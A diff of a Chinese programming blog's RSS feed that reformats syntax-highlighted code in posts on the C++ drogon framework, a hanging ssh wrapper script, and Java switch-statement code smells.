+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#228b22&#34;&gt;//your declaration of processing function maybe like this:
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;void&lt;/span&gt; getInfo(&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;const&lt;/span&gt; HttpRequestPtr &amp;amp;req, std::function&amp;lt;&lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;void&lt;/span&gt;(&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;const&lt;/span&gt; HttpResponsePtr &amp;amp;)&amp;gt; &amp;amp;&amp;amp;callback, &lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;int&lt;/span&gt; userId) &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;const&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#008b45&#34;&gt;getDetailInfo&lt;/span&gt;(&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;const&lt;/span&gt; HttpRequestPtr &amp;amp;req, std::function&amp;lt;&lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;void&lt;/span&gt;(&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;const&lt;/span&gt; HttpResponsePtr &amp;amp;)&amp;gt; &amp;amp;&amp;amp;callback, &lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;int&lt;/span&gt; userId) &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;const&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#008b45&#34;&gt;newUser&lt;/span&gt;(&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;const&lt;/span&gt; HttpRequestPtr &amp;amp;req, std::function&amp;lt;&lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;void&lt;/span&gt;(&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;const&lt;/span&gt; HttpResponsePtr &amp;amp;)&amp;gt; &amp;amp;&amp;amp;callback, std::string &amp;amp;&amp;amp;userName);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;public&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;上述代码需要解决的问题：注册的&lt;code&gt;METHOD_ADD(User::getInfo, &amp;quot;/{id}&amp;quot;, Get);&lt;/code&gt;，对应的请求消息怎么路由到&lt;code&gt;getInfo&lt;/code&gt; 方法？&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;无反射机制的做法是，通过保存处理的函数指针，接收到请求再回调函数，函数签名只能是固定格式&lt;/li&gt;
 &lt;li&gt;但URL Pattern中会存在多个&lt;code&gt;{}&lt;/code&gt;替换参数，参数的类型可能是string, int, long等类型，是无固定参数&lt;/li&gt;
@@ -364,20 +379,20 @@
 &lt;p&gt;元旦哪里去不了，就呆在家里折腾VIM配置之后又看了一些C++的开源项目。国人开发的C++ web框架 &lt;a href=&#34;https://github.com/an-tao/drogon/&#34;&gt;drogon&lt;/a&gt; 在techempower上霸榜。techempower是一个专门给web框架做性能排名的网站。drogon在 &lt;a href=&#34;https://www.techempower.com/benchmarks/#section=data-r19&amp;amp;hw=ph&amp;amp;test=composite&#34;&gt;Round19测试&lt;/a&gt; 中，综合成绩排第一。&lt;/p&gt;
 &lt;p&gt;drogon是基于C++14/17，采用CMake构建，跨平台，全异步，自带高性能模板引擎CSP，基于模板实现了简单的反射机制的Web框架。&lt;/p&gt;
 &lt;p&gt;我10年前写过大约5年多的C++代码，使用的也是传统的C++，C++11之后称为modern C++。不再使用C++做项目之后， 也就断断续续关注自学过，并没有实际的项目实战经验。所以看drogon的源码还算能看懂，但有些用法还是不太熟悉。drogon代码中大量存在如下代码：对于一个setXXX方法，写了&lt;code&gt;const T&amp;amp; &lt;/code&gt;与&lt;code&gt;T &amp;amp;&amp;amp;&lt;/code&gt;两种入参。&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;    void setRecvMessageCallback(const RecvMessageCallback &amp;amp;cb)
-    {
-        recvMessageCallback_ = cb;
-    }
-    void setRecvMessageCallback(RecvMessageCallback &amp;amp;&amp;amp;cb)
-    {
-        recvMessageCallback_ = std::move(cb);
-    }
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;还有这种用法：&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;  for (auto &amp;amp;backend : config[&amp;#34;backends&amp;#34;])
-  {
-        backendAddrs_.emplace_back(backend.asString()); //并没有使用push_back
-  }
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    void setRecvMessageCallback(const RecvMessageCallback &amp;amp;cb)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        recvMessageCallback_ = cb;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    void setRecvMessageCallback(RecvMessageCallback &amp;amp;&amp;amp;cb)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        recvMessageCallback_ = std::move(cb);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;还有这种用法：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  for (auto &amp;amp;backend : config[&amp;#34;backends&amp;#34;])
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        backendAddrs_.emplace_back(backend.asString()); //并没有使用push_back
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  }
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
     </item>
     
     <item>
@@ -394,12 +409,12 @@
 &lt;li&gt;问题是部分命令能正常执行，部分命令执行之后不退出卡住&lt;/li&gt;
 &lt;/ul&gt;
 &lt;p&gt;那个wrapper脚本的关键逻辑如下:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;function&lt;/span&gt; ssh_exec_wrapper() {
-    &lt;span style=&#34;color:#658b00&#34;&gt;local&lt;/span&gt; &lt;span style=&#34;color:#00688b&#34;&gt;cmd&lt;/span&gt;=&lt;span style=&#34;color:#00688b&#34;&gt;$@&lt;/span&gt; &lt;span style=&#34;color:#228b22&#34;&gt;# [1]取命令行所有参数&lt;/span&gt;
-    check_cmd_in_white_list &lt;span style=&#34;color:#00688b&#34;&gt;$cmd&lt;/span&gt; &lt;span style=&#34;color:#228b22&#34;&gt;# [2]检查命令行的是否在白名单中&lt;/span&gt;
-    &lt;span style=&#34;color:#658b00&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#00688b&#34;&gt;$cmd&lt;/span&gt; |sh &lt;span style=&#34;color:#228b22&#34;&gt;# [3]执行命令&lt;/span&gt;
-}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;问题是会卡在第三行，执行部分命令行结束之后，却不能退出，开发同学百思不得其解，不知道问题出在哪些。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;function&lt;/span&gt; ssh_exec_wrapper() {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#658b00&#34;&gt;local&lt;/span&gt; &lt;span style=&#34;color:#00688b&#34;&gt;cmd&lt;/span&gt;=&lt;span style=&#34;color:#00688b&#34;&gt;$@&lt;/span&gt; &lt;span style=&#34;color:#228b22&#34;&gt;# [1]取命令行所有参数&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    check_cmd_in_white_list &lt;span style=&#34;color:#00688b&#34;&gt;$cmd&lt;/span&gt; &lt;span style=&#34;color:#228b22&#34;&gt;# [2]检查命令行的是否在白名单中&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#658b00&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#00688b&#34;&gt;$cmd&lt;/span&gt; |sh &lt;span style=&#34;color:#228b22&#34;&gt;# [3]执行命令&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;问题是会卡在第三行，执行部分命令行结束之后，却不能退出，开发同学百思不得其解，不知道问题出在哪些。&lt;/p&gt;
 &lt;p&gt;会卡的命令大概如下：&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;orted -mca ess &amp;quot;env&amp;quot; -mca ess_base_iobid &amp;quot;833290240&amp;quot; ...&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;这个命令长度有215个字符，其中包括有空格，双引号(&amp;quot;)，分号(;)，逗号（,）与脱字符(^)&lt;/p&gt;
@@ -414,47 +429,47 @@
       <guid>http://lanlingzi.cn/post/technical/2020/1129_code/</guid>
       <description>&lt;h1 id=&#34;案例&#34;&gt;案例&lt;/h1&gt;
 &lt;p&gt;案例代码来源我们某产品：&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#008b45&#34;&gt;rollbackOrgPackage&lt;/span&gt;(Map&amp;lt;String, Object&amp;gt; oldOrgPackage, String orgName) &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;throw&lt;/span&gt; ApigwException, ParseException {
-    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;if&lt;/span&gt; (StringUtil.&lt;span style=&#34;color:#658b00&#34;&gt;isEmpyt&lt;/span&gt;(orgName)) {
-        &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;throw&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;new&lt;/span&gt; BackParameterException(...);
-    }
-
-    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;for&lt;/span&gt; (Entry&amp;lt;String, Object&amp;gt; orgPackage: oldOrgPackage.&lt;span style=&#34;color:#658b00&#34;&gt;entrySet&lt;/span&gt;()) {
-        &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;switch&lt;/span&gt; ( orgPackage.&lt;span style=&#34;color:#658b00&#34;&gt;getKey&lt;/span&gt;() ) {
-            &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;orgAssets&amp;#34;&lt;/span&gt;:
-                List&amp;lt;TApigwOrgAsset&amp;gt; orgAssets = (List&amp;lt;ApigwOrgAsset&amp;gt;) orgPackage.&lt;span style=&#34;color:#658b00&#34;&gt;getValue&lt;/span&gt;();
-                List&amp;lt;TApigwAssetContent&amp;gt; orgAssetContents = (List&amp;lt;TApigwAssetContent&amp;gt;) oldOrgPackage.&lt;span style=&#34;color:#658b00&#34;&gt;get&lt;/span&gt;(&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;&amp;#39;&lt;/span&gt;orgAssetContents&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;&amp;#39;&lt;/span&gt;);
-                &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;try&lt;/span&gt; {
-                    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;if&lt;/span&gt; (orgAssets != &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;null&lt;/span&gt;) {
-                        &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;for&lt;/span&gt; (TApigwOrgAsset orgAsset: orgAssets) {
-                            aTApigwAssetContentMapper.&lt;span style=&#34;color:#658b00&#34;&gt;deleteByPrimaryKey&lt;/span&gt;(orgAsset.&lt;span style=&#34;color:#658b00&#34;&gt;getAstid&lt;/span&gt;());
-                            aTApigwOrgAssetMapp.&lt;span style=&#34;color:#658b00&#34;&gt;deleteByOrgName&lt;/span&gt;(orgName, orgAsset.&lt;span style=&#34;color:#658b00&#34;&gt;getZone&lt;/span&gt;());
-                        }
-                    }
-
-                    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;if&lt;/span&gt; (orgAssets == &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;null&lt;/span&gt; || orgAssetContents == &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;null&lt;/span&gt;) {
-                        &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;break&lt;/span&gt;;
-                    }
-                    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;for&lt;/span&gt;(TApigwOrgAsset aTApigwOrgAsset: orgAssets){
-                        aTApigwOrgAssetMapper.&lt;span style=&#34;color:#658b00&#34;&gt;insert&lt;/span&gt;(aTApigwOrgAsset);
-                    }
-                    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;for&lt;/span&gt;(TApigwAssetContent orgAssetConent: orgAssetContents){
-                        aTApigwAssetConentMapper.&lt;span style=&#34;color:#658b00&#34;&gt;insert&lt;/span&gt;(orgAssetConent);
-                    }
-                } &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;catch&lt;/span&gt; (Excetption e) {
-                    threw &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#008b45&#34;&gt;ApigwExcepiton&lt;/span&gt;(...)
-                }
-                &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;break&lt;/span&gt;;
-            &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;orgService&amp;#34;&lt;/span&gt;:
-                ... &lt;span style=&#34;color:#228b22&#34;&gt;// 省略
-&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;orgConfigGroups&amp;#34;&lt;/span&gt;:
-                ... &lt;span style=&#34;color:#228b22&#34;&gt;// 省略
-&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;orgVariables&amp;#34;&lt;/span&gt;:
-                ... &lt;span style=&#34;color:#228b22&#34;&gt;// 省略
-&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;        }
-    }
-}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;上面的代码存在典型的switch惊悚的坏味道。每个Switch块较大，嵌套比较深，在Swith中又存在for循环。还存其它的坏味道：&lt;/p&gt;</description>
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#008b45&#34;&gt;rollbackOrgPackage&lt;/span&gt;(Map&amp;lt;String, Object&amp;gt; oldOrgPackage, String orgName) &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;throw&lt;/span&gt; ApigwException, ParseException {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;if&lt;/span&gt; (StringUtil.&lt;span style=&#34;color:#658b00&#34;&gt;isEmpyt&lt;/span&gt;(orgName)) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;throw&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;new&lt;/span&gt; BackParameterException(...);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;for&lt;/span&gt; (Entry&amp;lt;String, Object&amp;gt; orgPackage: oldOrgPackage.&lt;span style=&#34;color:#658b00&#34;&gt;entrySet&lt;/span&gt;()) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;switch&lt;/span&gt; ( orgPackage.&lt;span style=&#34;color:#658b00&#34;&gt;getKey&lt;/span&gt;() ) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;orgAssets&amp;#34;&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                List&amp;lt;TApigwOrgAsset&amp;gt; orgAssets = (List&amp;lt;ApigwOrgAsset&amp;gt;) orgPackage.&lt;span style=&#34;color:#658b00&#34;&gt;getValue&lt;/span&gt;();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                List&amp;lt;TApigwAssetContent&amp;gt; orgAssetContents = (List&amp;lt;TApigwAssetContent&amp;gt;) oldOrgPackage.&lt;span style=&#34;color:#658b00&#34;&gt;get&lt;/span&gt;(&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;&amp;#39;&lt;/span&gt;orgAssetContents&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;&amp;#39;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;try&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;if&lt;/span&gt; (orgAssets != &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;null&lt;/span&gt;) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                        &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;for&lt;/span&gt; (TApigwOrgAsset orgAsset: orgAssets) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                            aTApigwAssetContentMapper.&lt;span style=&#34;color:#658b00&#34;&gt;deleteByPrimaryKey&lt;/span&gt;(orgAsset.&lt;span style=&#34;color:#658b00&#34;&gt;getAstid&lt;/span&gt;());
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                            aTApigwOrgAssetMapp.&lt;span style=&#34;color:#658b00&#34;&gt;deleteByOrgName&lt;/span&gt;(orgName, orgAsset.&lt;span style=&#34;color:#658b00&#34;&gt;getZone&lt;/span&gt;());
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                        }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;if&lt;/span&gt; (orgAssets == &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;null&lt;/span&gt; || orgAssetContents == &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;null&lt;/span&gt;) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                        &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;break&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;for&lt;/span&gt;(TApigwOrgAsset aTApigwOrgAsset: orgAssets){
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                        aTApigwOrgAssetMapper.&lt;span style=&#34;color:#658b00&#34;&gt;insert&lt;/span&gt;(aTApigwOrgAsset);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;for&lt;/span&gt;(TApigwAssetContent orgAssetConent: orgAssetContents){
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                        aTApigwAssetConentMapper.&lt;span style=&#34;color:#658b00&#34;&gt;insert&lt;/span&gt;(orgAssetConent);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                } &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;catch&lt;/span&gt; (Excetption e) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    threw &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#008b45&#34;&gt;ApigwExcepiton&lt;/span&gt;(...)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;break&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;orgService&amp;#34;&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                ... &lt;span style=&#34;color:#228b22&#34;&gt;// 省略
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;orgConfigGroups&amp;#34;&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                ... &lt;span style=&#34;color:#228b22&#34;&gt;// 省略
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;orgVariables&amp;#34;&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                ... &lt;span style=&#34;color:#228b22&#34;&gt;// 省略
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;        }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;上面的代码存在典型的switch惊悚的坏味道。每个Switch块较大，嵌套比较深，在Swith中又存在for循环。还存其它的坏味道：&lt;/p&gt;</description>
     </item>
     
     <item>
@@ -478,35 +493,35 @@
       <guid>http://lanlingzi.cn/post/technical/2020/1108_code/</guid>
       <description>&lt;h1 id=&#34;案例&#34;&gt;案例&lt;/h1&gt;
 &lt;p&gt;案例一，代码摘抄某外部培训材料，主要代码逻辑是打印每课成绩，并找出学生非&lt;code&gt;F&lt;/code&gt;级别课程统计平均分数：&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#008b45;font-weight:bold&#34;&gt;CourseGrade&lt;/span&gt; {
-    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;public&lt;/span&gt; String title;
